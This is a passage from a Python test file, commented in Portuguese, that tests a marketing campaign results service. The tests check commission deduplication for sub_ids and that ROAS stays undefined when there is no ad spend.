    assert len(r["linhas"]) == 2, "o sub_id manual virou linha de grupo"


def test_sub_id_de_grupo_vinculado_a_mao_nao_conta_duas_vezes(db):
    """
    A dedup é o ponto inteiro: o mesmo sub_id vinculado à mão E pertencente a um
    grupo da campanha somaria a comissão nas duas pontas.

    O service já bloqueia esse vínculo, mas a linha pode existir de uma versão
    anterior ou de um grupo adicionado DEPOIS do vínculo — e aí é o cálculo que
    precisa segurar.
    """
    from app.models.campanha_grupos import CampanhaSubId

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    db.add(CampanhaSubId(campanha_id=campanha.id, sub_id=grupos[0].sub_id))
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0), "comissão dobrada"
    assert r["totais"]["pedidos"] == 1


def test_roas_do_total_e_none_sem_investimento_nao_zero(db):
    """0.00x afirmaria que cada real gasto voltou zero — sem gasto, o ROAS não
    existe. Mesmo colapso null-vs-zero que o módulo evita em `leads` e `cpl`."""
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["totais"]["roas"] is None

    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=50.0, clicks=5, impressions=50, leads=None))
    db.commit()

    r2 = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r2["totais"]["roas"] == pytest.approx(2.0)   # 100 / 50
